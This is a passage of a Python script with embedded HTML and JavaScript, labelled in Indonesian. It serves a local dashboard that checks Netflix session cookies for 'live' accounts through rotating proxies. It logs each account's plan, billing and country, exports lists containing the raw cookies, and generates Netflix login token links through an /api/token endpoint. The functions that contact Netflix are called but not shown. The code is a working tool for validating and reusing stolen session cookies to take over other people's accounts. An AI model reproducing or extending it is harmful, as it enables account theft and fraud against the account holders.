    const lines = lives.map((r, i) => `[${i+1}] Plan: ${r.plan} | Billing: ${r.billing} | Country: ${r.country}\\nCookie: ${r.raw}\\n----------------------------------`);
    blob = new Blob([lines.join('\\n')], {type: 'text/plain'});
    filename = `netflix_live_${Date.now()}.txt`;
  } else {
    blob = new Blob([JSON.stringify(lives, null, 2)], {type: 'application/json'});
    filename = `netflix_live_${Date.now()}.json`;
  }
  const a = document.createElement('a');
  a.href = URL.createObjectURL(blob);
  a.download = filename;
  a.click();
}

async function loadHistory() {
  const tbody = document.getElementById('history-tbody');
  tbody.innerHTML = '<tr><td colspan="7">Memuat...</td></tr>';
  try {
    const res = await fetch('/api/history');
    const rows = await res.json();
    if (rows.length === 0) { tbody.innerHTML = '<tr><td colspan="7">Belum ada riwayat.</td></tr>'; return; }
    tbody.innerHTML = rows.map(r => `
      <tr>
        <td style="color:var(--text-muted)">${r.created_at}</td>
        <td>${r.type.toUpperCase()}</td>
        <td class="${r.status === 'LIVE' ? 'tag-live' : 'tag-dead'}">${r.status}</td>
        <td>${r.plan || '-'}</td>
        <td>${r.billing || '-'}</td>
        <td>${r.country || '-'}</td>
        <td>${r.token_url ? `<a href="${r.token_url}" target="_blank" style="color:#60a5fa">Buka Link</a>` : '-'}</td>
      </tr>
    `).join('');
  } catch(e) {
    tbody.innerHTML = '<tr><td colspan="7">Gagal memuat riwayat.</td></tr>';
  }
}

async function clearDbHistory() {
  if (!confirm('Yakin ingin menghapus seluruh riwayat di SQLite?')) return;
  await fetch('/api/history/clear', {method: 'POST'});
  loadHistory();
}

function copyText(str) { navigator.clipboard.writeText(str); alert('Disalin ke clipboard!'); }
function copyJson(obj) { navigator.clipboard.writeText(JSON.stringify(obj, null, 2)); alert('Cookie JSON disalin!'); }

fetchStats();
</script>
</body>
</html>
"""

class Handler(http.server.BaseHTTPRequestHandler):
    def log_message(self, format, *args):
        pass

    def do_GET(self):
        if self.path in ("/", "/index.html") or self.path.startswith("/?"):
            self.send_response(200)
            self.send_header("Content-Type", "text/html; charset=utf-8")
            self.end_headers()
            self.wfile.write(HTML.encode("utf-8"))
        elif self.path == "/api/proxies":
            all_p = load_proxies()
            with proxy_lock:
                h_count = len(healthy_proxies) if healthy_proxies else len(all_p)
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.end_headers()
            self.wfile.write(json.dumps({"total": len(all_p), "healthy": h_count}).encode("utf-8"))
        elif self.path == "/api/history":
            rows = get_history()
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.end_headers()
            self.wfile.write(json.dumps(rows).encode("utf-8"))
        else:
            self.send_response(404)
            self.end_headers()

    def do_POST(self):
        clen = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(clen) if clen > 0 else b"{}"

        if self.path == "/api/token":
            try:
                p = json.loads(body.decode("utf-8"))
                url, exp, route = generate_nftoken(p.get("cookie", ""), use_proxy=p.get("use_proxy", True))
                res = json.dumps({"url": url, "expires": exp, "route": route}).encode("utf-8")
                self.send_response(200)
            except Exception as e:
                res = json.dumps({"error": str(e)}).encode("utf-8")
                self.send_response(400)
            self.send_header("Content-Type", "application/json")
            self.end_headers()
            self.wfile.write(res)

        elif self.path == "/api/check":
            try:
                p = json.loads(body.decode("utf-8"))
                out = check_netflix_membership(p.get("cookie", ""), use_proxy=p.get("use_proxy", True))
                res = json.dumps(out).encode("utf-8")
                self.send_response(200)
            except Exception as e:
                res = json.dumps({"live": False, "reason": str(e)}).encode("utf-8")
                self.send_response(400)
            self.send_header("Content-Type", "application/json")
            self.end_headers()
            self.wfile.write(res)

        elif self.path == "/api/history/clear":
            clear_history()
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.end_headers()
            self.wfile.write(b'{"status": "cleared"}')
        else:
            self.send_response(404)
            self.end_headers()

class ThreadingSimpleServer(socketserver.ThreadingMixIn, http.server.HTTPServer):
    daemon_threads = True

def run():
    init_db()
    t = threading.Thread(target=proxy_health_worker, daemon=True)
    t.start()
    socketserver.TCPServer.allow_reuse_address = True
    server = ThreadingSimpleServer(("", PORT), Handler)
    print(f"Server jalan: http://localhost:{PORT}")
    server.serve_forever()

if __name__ == "__main__":
    run()
